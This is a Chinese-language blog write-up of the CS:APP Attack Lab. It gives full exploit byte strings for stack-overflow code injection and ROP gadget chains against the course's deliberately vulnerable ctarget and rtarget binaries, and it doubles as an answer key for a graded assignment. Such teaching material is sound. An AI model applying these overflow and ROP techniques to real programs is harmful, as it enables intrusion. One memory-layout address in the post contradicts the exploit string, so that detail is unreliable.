---
date: 2024-07-25
title: "CSAPP-Attacklab"
category: 学习经验
tags: [lab, CSAPP]
excerpt: "CSAPP Attacklab"
---

# 前言
>This assignment involves generating a total of five attacks on two programs having different security vulnerabilities. Outcomes you will gain from this lab include:
>
>- You will learn different ways that attackers can exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows.
>- Through this, you will get a better understanding of how to write programs that are more secure, as well as some of the features provided by compilers and operating systems to make programs less vulnerable.
>- You will gain a deeper understanding of the stack and parameter-passing mechanisms of x86-64 machine code.
>- You will gain a deeper understanding of how x86-64 instructions are encoded.
>- You will gain more experience with debugging tools such as GDB and OBJDUMP.
>
>**Note**: In this lab, you will gain firsthand experience with methods used to exploit security weaknesses in operating systems and network servers. Our purpose is to help you learn about the runtime operation of programs and to understand the nature of these security weaknesses so that you can avoid them when you write system code. We do not condone the use of any other form of attack to gain unauthorized access to any system resources.
>
>You will want to study Sections 3.10.3 and 3.10.4 of the CS:APP3e book as reference material for this lab.

该lab要求我们利用栈溢出漏洞，实现攻击程序的功能。

规则如下：
>Here is a summary of some important rules regarding valid solutions for this lab. These points will not make much sense when you read this document for the first time. They are presented here as a central reference of rules once you get started.
>- You must do the assignment on a machine that is similar to the one that generated your targets.
>- Your solutions may not use attacks to circumvent the validation code in the programs. Specifically,
>any address you incorporate into an attack string for use by a ret instruction should be to one of the
>following destinations:
>   - The addresses for functions touch1, touch2, or touch3.
>   - The address of your injected code
>   - The address of one of your gadgets from the gadget farm.
>- You may only construct gadgets from file rtarget with addresses ranging between those for functions start_farm and end_farm.

当我们在进行代码注入攻击时只可以让程序跳转到touch1、touch2、touch3、gadget farm(farm.c)中的gadget或者我们注入的代码中,**不可以让程序跳过检查逻辑**。

当我们在进行ROP攻击时，**只可以使用rtarget中提供的gadget**(包含在farm.c中)。

# 辅助工具hex2raw说明
本次lab提供了一个辅助工具hex2raw，该工具允许我们输入16进制字节码，生成一个二进制文件，该二进制文件的内容就是输入的16进制字节码。

该工具要求输入的16进制字节码必须是以空格分隔的，每个字节码必须是两个16进制字符组成的。

同时该工具允许使用类C语言的注释，即以/\*开头，以\*/结尾的内容会被忽略。请保证注释的开始和结束是成对出现的。

该工具输出的字符如果进入命令行，很有可能会因为种种原因无法正常读取。所以我们可以选择先将输出结果暂存到一个文件中，然后再将该文件作为输入文件。

例如part1.level1可以使用如下命令检查是否正确：
```bash
./hex2raw -i inputFileName > tempFileName
./ctarget -q -i tempFileName
```

# 如何生成二进制指令
在lab说明文档的附加B部分，提供了一个生成二进制指令的方法。

我们可以使用gcc编译器，将汇编代码编译成二进制文件，然后使用objdump工具将二进制文件转换成16进制字节码。

例如我们有一个编写好的汇编代码example.s。
```
# Example of hand-generated assembly code
    pushq $0xabcdef     # Push value onto stack
    addq $17,%rax       # Add 17 to %rax
    movl %eax,%edx      # Copy lower 32 bits to %edx
```

我们可以使用gcc编译器将其编译成二进制文件。
```bash
gcc -c example.s
```

然后我们可以使用objdump工具将二进制文件转换成16进制字节码。
```bash
objdump -d example.o > example.d
```

再通过hex2raw工具即可将16进制字节码转换成二进制文件。


# Part1: Code Injection Attacks
>For the first three phases, your exploit strings will attack CTARGET. This program is set up in a way that
the stack positions will be consistent from one run to the next and so that data on the stack can be treated as
executable code. These features make the program vulnerable to attacks where the exploit strings contain
the byte encodings of executable code.

**ctarget程序没有开启栈随机化**，所以每次运行时栈的位置都是固定的，而且程序允许我们将栈上的数据当作可执行代码来执行，**这使得我们可以将我们的攻击代码注入到栈上**。

## 1.1: Level 1
>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

我们的目标是输入一个字符串让getbuf函数执行完后，跳转到touch1函数，而不是返回到test函数。

这题不需要我们注入代码，只需要让程序跳转到touch1函数即可。

简单来说就是**通过栈溢出，覆盖掉返回地址**，让程序跳转到touch1函数。

我们可以通过GDB调试程序，找到touch1函数的地址，然后构造一个字符串，让程序跳转到touch1函数即可。

通过GDB查看得到touch1函数的地址为0x4017c0。

同时我们需要知道getbuf函数的栈帧大小，这样我们才能知道我们需要填充多少字节才能覆盖到返回地址。通过GDB查看得到getbuf函数的栈帧大小为0x28。即40个字节。

最后要注意的是，我们**需要将touch1函数的地址转换为小端字节序**，因为x86-64是小端字节序。

最后的输入文件为：
```
00 00 00 00 00 00 00 00 00 00 /* 10字节的填充字符 */
00 00 00 00 00 00 00 00 00 00 /* 10字节的填充字符 */
00 00 00 00 00 00 00 00 00 00 /* 10字节的填充字符 */
00 00 00 00 00 00 00 00 00 00 /* 10字节的填充字符 */ 
c0 17 40 00 00 00 00 00       /* touch1函数的地址(小端序) */
```

## 1.2: Level 2
>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

这次我们不仅要让程序跳转到touch2函数，还要**传递一个cookie给touch2函数**。

根据文档中的提示，**cookie通过寄存器%rdi传递给touch2函数**。

因此我们在跳转到touch2函数之前，需要将cookie的值放到%rdi寄存器中。

我们可以把这个过程整理成要注入的代码，然后**通过溢出覆盖返回地址，让程序的控制跳转到我们注入的代码中**。

在注入的代码中我们修改%rdi寄存器的值，然后跳转到touch2函数。

我们需要在40个字节内完成注入代码的编写。提示中说不要用call和jmp，因为这两个指令的代码较难构造，因**此我们可以使用push和ret指令来实现**。

汇编代码如下：
```
movq $0x59b997fa,%rdi   #将cookie的值放到%rdi寄存器中
pushq $0x4017ec         #将touch2的函数地址压栈
ret                     #跳转到touch2函数
```

得到的16进制字节码为：
```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```

**我们选择将其起始地址置于原始栈顶的位置**

通过GDB查看得到getbuf的栈顶位置为0x5561dc78，所以我们通过溢出将返回地址覆盖为0x5561dc78。

在此之前先填充至40字节。

最后要注入的字符串为：
```
48 c7 c7 fa 97 b9 59        /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00              /* pushq  $0x4017ec */
c3                          /* retq   */
00 00 00 00 00 00 00 00 00  /* 再填充27个字节 */
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00     /* 0x5561dc78的小端序*/
```

## 1.3: Level 3
>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.
>Some Advice:
>- You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
>- Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.
>- Your injected code should set register %rdi to the address of this string.
>- When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie

这次我们需要**让cookie以字符串的形式传递给touch3函数**。

和之前一样，我们需要将返回地址覆盖为我们注入的代码的首地址，不同的是这次还要将cookie字符串也注入到栈上。

提示中说，**在strncmp中，会将一些数据压栈**(例如一些要求的调用者保存的寄存器)，这些数据会覆盖掉getbuf函数的栈帧，因此我们需要将cookie的字符串放到一个安全的位置。

~~我们可以选择将cookie字符串放到最低的位置，这样应该能够避免被覆盖。~~

~~所以将cookie字符串放置于最开始的位置。~~

非常可惜，**经过实验，放置于最低位仍然会被覆盖**。

我想到的另一个思路是**通过溢出将cookie字符串放置到高位**(比原本放置返回地址还要高的地方)。注意到**touch3在调用后马上就会使程序退出**，所以我们就算破坏原有的栈数据也不会导致结果错误。

在读取完字符串之后，内存的布局应该如下：
```
低[0x5561dc78,0x5561dca0): 40个字节的填充字符以及注入代码
  [0x5561dca0,0x5561dca8): 注入代码的首地址(4字)
高[0x5561dca8,0x5561dcb1): cookie字符串
```

hexmatch函数通过sprintf(s, "%.8x", val)，将cookie解释成字符串，然后通过strncmp函数比较两个字符串是否相等。

sprintf将cookie打印成一个十六进制字符串，**根据提示，输出的十六进制字符串不包含0x前缀**，这样的字符串以ASCII码形式存储在栈上，同时以\0结尾。

根据ASCII码表，cookie 0x59b997fa在内存中存储为
```
打印数据显示:
59b997fa

实际内存:
低地址               高地址
5  9  b  9  9  7  f  a  \0      (字符)
35 39 62 39 39 37 66 61 00      (十六进制ASCII码)
```

这样我们就确定了要填充的字符的内容。

然后我们要想办法将cookie字符串的地址(0x5561dca8)放到%rdi寄存器中，然后调用touch3函数。

编写汇编指令如下：
```
movq  $0x5561dca8, %rdi  #注入字符串的首地址
pushq $0x4018fa          #touch3的首地址
retq
```

**按照我们之前提到的内存布局**，最后要注入的字符串为：
```
48 c7 c7 a8 dc 61 55        /* mov   $0x5561dca8,%rdi, cookie字符串的首地址 */
68 fa 18 40 00              /* pushq $0x4018fa */
c3                          /* retq */

00 00 00 00 00 00 00 00 00  /* 填充27字节 */
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00

78 dc 61 55 00 00 00 00     /* 注入代码的首地址0x5561dc78 ，这里需要完整的四字 */
35 39 62 39 39 37 66 61 00  /* cookie字符串 */
```

# Part2: Return-Oriented Programming
>Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET,because it uses two techniques to thwart such attacks:
>- It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
>- It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault

rtarget程序开启了栈随机化，所以每次运行时栈的位置都是不同的，而且程序不允许我们将栈上的数据当作可执行代码来执行，**这使得我们无法将我们的攻击代码注入到栈上**。

这时我们就需要名为*Return-Oriented Programming*(ROP，面向返回的编程)的技术。

该技术利用程序中已存在的可执行代码，通过构造一系列的gadget，来实现我们的攻击目的。

想要具体的了解该技术，可以观看该视频：[《2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频》](https://www.bilibili.com/video/BV1iW411d7hd?p=9&vd_source=41f40e98b6eaf1e89c64b536001ad412)P9 1:03:25开始的部分。

简单来说我们就是要在程序已存在的可执行代码中，找到一些特定的指令序列，然后通过构造一系列的gadget，来实现我们的攻击目的。gadget可能是一条完整的指令，也可能是某些指令的一部分。


## 2.1: Level 2
>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).
>- *movq* : The codes for these are shown in Figure 3A.
>- *popq* : The codes for these are shown in Figure 3B.
>- *ret* : This instruction is encoded by the single 
>- *byte* 0xc3.
>- *nop* : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.
>
>Some Advice:
>- All the gadgets you need can be found in the region of the code for rtarget demarcated by the
>functions start_farm and mid_farm.
>- You can do this attack with just two gadgets.
>- When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.

可能会用到以下两个表格中的指令。

**movq S, D**

|S \ D| %rax     | %rcx     | %rdx     | %rbx     | %rsp     | %rbp     | %rsi     | %rdi    |
|---- | -------- | -------- | -------- | -------- | -------- | -------- | -------- | --------|
|%rax | 48 89 c0 | 48 89 c1 | 48 89 c2 | 48 89 c3 | 48 89 c4 | 48 89 c5 | 48 89 c6 | 48 89 c7|
|%rcx | 48 89 c8 | 48 89 c9 | 48 89 ca | 48 89 cb | 48 89 cc | 48 89 cd | 48 89 ce | 48 89 cf|
|%rdx | 48 89 d0 | 48 89 d1 | 48 89 d2 | 48 89 d3 | 48 89 d4 | 48 89 d5 | 48 89 d6 | 48 89 d7|
|%rbx | 48 89 d8 | 48 89 d9 | 48 89 da | 48 89 db | 48 89 dc | 48 89 dd | 48 89 de | 48 89 df|
|%rsp | 48 89 e0 | 48 89 e1 | 48 89 e2 | 48 89 e3 | 48 89 e4 | 48 89 e5 | 48 89 e6 | 48 89 e7|
|%rbp | 48 89 e8 | 48 89 e9 | 48 89 ea | 48 89 eb | 48 89 ec | 48 89 ed | 48 89 ee | 48 89 ef|
|%rsi | 48 89 f0 | 48 89 f1 | 48 89 f2 | 48 89 f3 | 48 89 f4 | 48 89 f5 | 48 89 f6 | 48 89 f7|
|%rdi | 48 89 f8 | 48 89 f9 | 48 89 fa | 48 89 fb | 48 89 fc | 48 89 fd | 48 89 fe | 48 89 ff|

**popq R**

|       | %rax | %rcx | %rdx | %rbx | %rsp | %rbp | %rsi | %rdi|
|-------| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----|
|popq __R__ | 58   | 59   | 5a   | 5b   | 5c   | 5d   | 5e   | 5f  |

由part1.level2可知我们要做的就是将cookie的值放到%rdi寄存器中，然后跳转到touch2函数。

也就是要想办法执行以下汇编指令：
```
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

我不认为在rtarget中能够找到这些包含特定常数的值。

我们可以将这些常数依次放置在栈上，然后通过gadget将其放到寄存器中。

假如在栈上0x59b997fa和0x4017ec按顺序排布，我们可以尝试以下指令。

```
popq %rax         #将栈顶的值弹出到%rax寄存器中
movq %rax, %rdi   #将%rax寄存器的值复制到%rdi寄存器中
retq              #将栈顶值作为返回地址，跳转到touch2函数
```

按照上表译码为16进制字节码为：
```
58 
48 89 c7
c3
```

使用objdump工具获得rtarget的汇编代码，按照提示，我们重点关注start_farm和mid_farm之间的代码。在这些代码中，重点关注带有c3指令的代码。

```bash
objdump -d rtarget > rtarget.d
```

在getval_280中，我们发现了一组很有意思的字节
```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret   
```

其中的58 90 c3正好是popq %rax; nop; retq的16进制字节码。

我们可以将这段字节码作为gadget，将栈上的值弹出到%rax寄存器中。

然后我们需要找到一个gadget，将%rax寄存器的值复制到%rdi寄存器中。

可以在getval_273中找到
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    
```

其中的48 89 c7正好是movq %rax, %rdi的16进制字节码。

后面还刚好跟了一个c3。这正是我们需要的gadget。

最后我们要执行的指令为：
```
#gadget1, 起始地址0x4019cc
pop %rax 
nop
retq

#gadget2, 起始地址0x4019a2
movq %rax, %rdi
retq
```

栈中要填入的数据从低地址到高地址依次为：
```
低[0x5561dc78,0x5561dca0): 40个字节的填充字符
  [0x5561dca0,0x5561dca8): gadget1的首地址0x4013cc
  [0x5561dca8,0x5561dcb0): cookie的值0x59b997fa
  [0x5561dcb0,0x5561dcb8): gadget2的首地址0x4019a2
高[0x5561dcb8,0x5561dcc0): touch2的首地址0x4017ec
```

注意下小端序，依次构造即可。

最后要注入的字符串为：
```
00 00 00 00 00 00 00 00 /* 四十个填充字节 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

cc 19 40 00 00 00 00 00 /* gadget1的首地址，小端序 */

fa 97 b9 59 00 00 00 00 /* cookie的值，小端序 */

a2 19 40 00 00 00 00 00 /* gadget2的首地址，小端序 */

ec 17 40 00 00 00 00 00 /* touch2的首地址，小端序 */
```

## 2.2: Level 3

>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
>
>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.

这次我们需要**让cookie以字符串的形式传递给touch3函数**。

该题的难度非常大，CMU的教授将这题作为附加题，只有5分，为了更好地理解ROP攻击，我们还是尝试一下吧。

总体上思路和part1.level3类似，我们需要将cookie字符串放置到一个安全的位置，然后通过gadget将其放到%rdi寄存器中，然后调用touch3函数。

理想转态下我们可以通过执行以下汇编指令来实现：
```
movq xxx, %rdi  #注入字符串的首地址
pushq $0x4018fa          #touch3的首地址
retq
```

经过测试，**在farm中的所有字节中找不到可用的push指令**。

似乎要改变一下思路了。

如果我们能够**将%rsp的值进行一些加减运算**，那么通过偏移可以很方便地得到cookie字符串的地址。

可惜经过测试，**在farm中的所有字节中找不到直接可用的递增或者递减指令**。

但是我们可以注意到**有一个函数明显是用来进行加减运算的**，即*add_xy*。

分析该函数的汇编，该函数将%rdi和%rsi相加，然后将结果放到%rax中。

**我们去寻找所有与这三个寄存器相关的指令**(这是个非常煎熬的过程。。。)

可以找到以下几个相关的gadget(从gadget集合中筛选出来的，序号未更改)
```
<gadget2>->0x401aad
48 89 e0 90 c3
mov %rsp, %rax
nop
ret

<gadget4>->0x4019a2
48 89 c7 c3
mov %rax, %rdi
ret

<gadget3>->0x4019cc
58 90 c3
pop %rax
nop
ret

<gadget5>->0x4019dd
89 c2 90 c3
mov %eax, %edx
nop
ret

<gadget8>->0x401a34
89 d1 38 c9 c3
mov %edx, %ecx
cmp %cl, %cl
ret

<gadget7>->0x401a27
89 ce 38 c0 c3
mov %ecx, %esi
cmp %al, %al
ret
```

这样一来我们的任务就是组合这些gadget，使%rsp按照我们的想法进行偏移获取到cookie字符串的地址。然后通过ret跳转到touch3函数。

**想要利用add_xy，我们要以放入%rdi和%rsi的值为最终目标。**

%rsp的值可以通过以下过程放入%rdi中：
```
<gadget2>->0x401aad
mov %rsp, %rax #rax保存初始栈顶
nop
ret

<gadget4>->0x4019a2
mov %rax, %rdi #rdi保存初始栈顶
ret
```

假设偏移量为x，该偏移量可以通过以下过程放入%rsi中：
```
<gadget3>->0x4019cc
popq %rax             # rax = x, 从栈上获得我们预先设置的x值
nop
ret

<gadget5>->0x4019dd
mov %eax, %edx        # edx = x
nop
ret

<gadget8>->0x401a34
mov %edx, %ecx        # ecx = x
cmp %cl, %cl
ret

<gadget7>->0x401a27
mov %ecx, %esi        # esi = x
cmp %al, %al
ret
```
**注意以上两个过程是不可以交换的**，因为在操作途中使用的%edx，%esi，%ecx等寄存器的低32位会导致地址值被截断，导致最后的结果错误。我就是因为这个问题卡了好久。。。

综合一下，最后的汇编指令大致如下：
```
<gadget2>->0x401aad
mov %rsp, %rax #rax保存初始栈顶
nop
ret

<gadget4>->0x4019a2
mov %rax, %rdi #rdi保存初始栈顶
ret

<gadget3>->0x4019cc
popq %rax # rax = x
nop
ret

<gadget5>->0x4019dd
mov %eax, %edx # edx = rax = x
nop
ret

<gadget8>->0x401a34
mov %edx, %ecx # ecx = edx = x
cmp %cl, %cl
ret

<gadget7>->0x401a27
mov %ecx, %esi # esi = ecx = x
cmp %al, %al
ret

<jmp to add_xy>->0x4019d6
%rax = %rdi + %rsi(初始栈顶 + x，即为cookie的首地址)
ret

<gadget4>->0x4019a2
mov %rax, %rdi #rdi保存cookie首地址
ret
<jmp to touch3>->0x4018fa
```

然后**注意一下正确计算x的值以及在栈上放置x的值，add_xy函数的地址，touch3函数的地址**。保证这些值的使用顺序。

x的值取决于保存%rsp的值和cookie字符串的地址的相对位置。

这个如果实在不确定可以通过GDB慢慢尝试。

最后要注入的字符串为：
```
00 00 00 00 00 00 00 00 /* 40个填充字节 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

ad 1a 40 00 00 00 00 00 /* gadget2 */
a2 19 40 00 00 00 00 00 /* gadget4 */
cc 19 40 00 00 00 00 00 /* gadget3 */
48 00 00 00 00 00 00 00 /* 8字节十六进制x的值 */
dd 19 40 00 00 00 00 00 /* gadget5 */
34 1a 40 00 00 00 00 00 /* gadget8 */
27 1a 40 00 00 00 00 00 /* gadget7 */
d6 19 40 00 00 00 00 00 /* add_xy */
a2 19 40 00 00 00 00 00 /* gadget4 */
fa 18 40 00 00 00 00 00 /* touch3 */

35 39 62 39 39 37 66 61 /* cookie字符串 */
00 00 00 00 00 00 00 00 
```